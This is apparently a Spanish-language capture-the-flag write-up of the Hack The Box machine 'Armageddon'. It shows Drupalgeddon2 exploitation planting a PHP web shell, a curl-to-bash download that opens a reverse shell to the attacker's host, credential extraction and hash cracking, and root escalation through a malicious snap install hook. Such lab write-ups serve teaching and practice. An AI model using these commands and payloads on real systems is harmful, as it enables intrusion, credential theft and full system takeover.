---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Armageddon

`Armageddon` es una máquina de dificultad fácil. Un sitio web Drupal explotable permite el acceso al host remoto. La enumeración de la estructura de archivos Drupal revela credenciales que nos permiten conectarnos al servidor MySQL y, eventualmente, extraer el hash que es reutilizable para un usuario del sistema. Usando estas credenciales, podemos conectarnos a la máquina remota a través de SSH. Este usuario puede instalar aplicaciones usando el administrador de paquetes `snap`. La escalada de privilegios es posible cargando e instalando en el host una aplicación maliciosa usando Snapcraft.

<figure><img src="../../.gitbook/assets/Armageddon.png" alt="" width="563"><figcaption></figcaption></figure>

***





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.233 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 10:14 CET
Initiating SYN Stealth Scan at 10:14
Scanning 10.10.10.233 [65535 ports]
Discovered open port 22/tcp on 10.10.10.233
Discovered open port 80/tcp on 10.10.10.233
Completed SYN Stealth Scan at 10:14, 12.38s elapsed (65535 total ports)
Nmap scan report for 10.10.10.233
Host is up, received user-set (0.048s latency).
Scanned at 2025-02-19 10:14:07 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65545 (2.623MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.233
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80 10.10.10.233 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 10:15 CET
Nmap scan report for 10.10.10.233
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.14
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   80.04 ms 10.10.16.1
2   27.77 ms 10.10.10.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (411).png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb http://10.10.10.233
http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
```



```bash
❯ curl -I http://10.10.10.233
HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 01:52:24 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
Content-Type: text/html; charset=utf-8
```



<figure><img src="../../.gitbook/assets/imagen (412).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (413).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2018-7600" %}

{% hint style="info" %}
Drupal anterior a 7.58, 8.x anterior a 8.3.9, 8.4.x anterior a 8.4.6 y 8.5.x anterior a 8.5.1 permite a atacantes remotos ejecutar código arbitrario debido a un problema que afecta a múltiples subsistemas con configuraciones de módulos predeterminadas o comunes.
{% endhint %}



{% embed url="https://github.com/dreadlocked/Drupalgeddon2" %}

```bash
❯ git clone https://github.com/dreadlocked/Drupalgeddon2; cd Drupalgeddon2
Clonando en 'Drupalgeddon2'...
remote: Enumerating objects: 257, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 257 (delta 0), reused 0 (delta 0), pack-reused 253 (from 1)
Recibiendo objetos: 100% (257/257), 102.12 KiB | 1.19 MiB/s, listo.
Resolviendo deltas: 100% (88/88), listo.
```



```bash
❯ ruby drupalgeddon2.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo MYZIHMVA
[+] Result : MYZIHMVA
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> whoami; id; ip a
apache
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:9c:f5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.233/24 brd 10.10.10.255 scope global noprefixroute ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::69d1:bb00:780c:f997/64 scope global noprefixroute dynamic 
       valid_lft 86393sec preferred_lft 14393sec
    inet6 fe80::7648:5ea1:5371:b3b5/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```



```bash
armageddon.htb>> which curl
/usr/bin/curl
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ catnp shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
armageddon.htb>> curl http://10.10.16.3/shell.sh|bash
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.233] 39100
bash: no job control in this shell
bash-4.2$ echo $SHELL
echo $SHELL
/sbin/nologin
```





```bash
bash-4.2$ ls -la
ls -la
total 288
drwxr-xr-x.  9 apache apache   4096 Feb 19 01:58 .
drwxr-xr-x.  4 root   root       33 Dec  3  2020 ..
-rw-r--r--.  1 apache apache    317 Jun 21  2017 .editorconfig
-rw-r--r--.  1 apache apache    174 Jun 21  2017 .gitignore
-rw-r--r--.  1 apache apache   6112 Jun 21  2017 .htaccess
-rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
-rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
-rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
-rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
-rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
-rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
-rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
-rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
-rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt
-rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
-rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
-rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
-rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php
-rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
drwxr-xr-x.  4 apache apache   4096 Dec  4  2020 misc
drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
-rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt
drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
-rw-r--r--.  1 apache apache     75 Feb 19 02:01 shell.php
drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
```





```bash
bash-4.2$ cd sites
cd sites
bash-4.2$ ls -la
ls -la
total 12
drwxr-xr-x. 4 apache apache   75 Jun 21  2017 .
drwxr-xr-x. 9 apache apache 4096 Feb 19 01:58 ..
-rw-r--r--. 1 apache apache  904 Jun 21  2017 README.txt
drwxr-xr-x. 5 apache apache   52 Jun 21  2017 all
dr-xr-xr-x. 3 apache apache   67 Dec  3  2020 default
-rw-r--r--. 1 apache apache 2365 Jun 21  2017 example.sites.php
bash-4.2$ cd default
cd default
bash-4.2$ ls -l 
ls -l
total 56
-rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
drwxrwxr-x. 3 apache apache    37 Dec  3  2020 files
-r--r--r--. 1 apache apache 26565 Dec  3  2020 settings.php
```





```bash
bash-4.2$ cat settings.php
<?php

/**
 * Database settings:
 *
 * The $databases array specifies the database connection or
 * connections that Drupal may use.  Drupal is able to connect
 * to multiple databases, including multiple types of databases,
 * during the same request.
 *
 * Each database connection is specified as an array of settings,
 * similar to the following:
 * @code
 * array(
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```



```bash
bash-4.2$ mysql -h localhost -e "show tables;" -u drupaluser -pCQHEy@9M*m23gBVj drupal
Tables_in_drupal
...[snip]...
users
...[snip]...
```





```bash
bash-4.2$ mysql -h localhost -e "SELECT * FROM users;" -u drupaluser -pCQHEy@9M*m23gBVj drupal
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
```



```bash
❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

7900 | Drupal7 | Forums, CMS, E-Commerce

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```



```bash
❯ sshpass -p booboo ssh brucetherealadmin@10.10.10.233
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ cat user.txt 
c13d01dd41747f70f4d80c5c2ab97aaf
```



```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```



````bash
❯ searchbins -b snap -f sudo

[+] Binary: snap

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/snap/#sudo]

It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh
%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

	| sudo snap install xxxx_1.0_all.snap --dangerous --devmode
````



```bash
❯ COMMAND=id
❯ cd $(mktemp -d)
❯ mkdir -p meta/hooks
❯ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
❯ chmod +x meta/hooks/install
❯ 
❯ fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}
❯ ls -l
drwxrwxr-x kali kali  60 B  Wed Feb 19 10:33:58 2025  meta
.rw-r--r-- kali kali 4.0 KB Wed Feb 19 10:34:11 2025  xxxx_1.0_all.snap
```



```bash
❯ scp xxxx_1.0_all.snap brucetherealadmin@10.10.10.233:/tmp/
brucetherealadmin@10.10.10.233's password: 
xxxx_1.0_all.snap                     100% 4096    42.2KB/s   00:00 
```



```bash
[brucetherealadmin@armageddon tmp]$ ls -l
total 4
-rw-r--r--. 1 brucetherealadmin brucetherealadmin 4096 feb 19 02:12 xxxx_1.0_all.snap
```



```bash
[brucetherealadmin@armageddon tmp]$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)
```



```bash
❯ COMMAND="/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'"
❯ cd $(mktemp -d)
❯ mkdir -p meta/hooks
❯ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
❯ chmod +x meta/hooks/install
❯ fpm -n xx -s dir -t snap -a all meta
Created package {:path=>"xx_1.0_all.snap"}
❯ scp xx_1.0_all.snap brucetherealadmin@10.10.10.233:/tmp/
brucetherealadmin@10.10.10.233's password: 
xx_1.0_all.snap                                                              100% 4096    40.6KB/s   00:00 
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
[brucetherealadmin@armageddon tmp]$ sudo snap install xx_1.0_all.snap --dangerous --devmode
Run install hook of "xx" snap if present
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.233] 39110
bash: cannot set terminal process group (2767): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3# whoami
whoami
root
bash-4.3# cat /root/root.txt
cat /root/root.txt
861ec4fc42c73846d37bad054b955623
```
